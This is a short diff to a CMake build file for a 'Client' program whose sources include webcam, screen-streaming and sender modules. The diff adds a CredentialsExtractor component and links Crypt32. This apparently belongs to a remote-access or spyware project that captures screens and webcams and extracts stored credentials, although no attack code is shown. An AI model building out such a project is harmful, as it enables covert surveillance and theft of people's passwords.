@@ -34,6 +34,8 @@ add_executable(Client
         src/sender/Sender.cpp
         src/webcam/WebcamManager.cpp
         src/screen/ScreenStreamer.cpp
+        src/credentials/CredentialsExtractor.cpp
+        includes/CredentialsExtractor.h
 )
 
 
@@ -45,4 +47,5 @@ target_link_libraries(Client
         stdc++fs
         strmiids
         gdiplus
+        Crypt32
 )
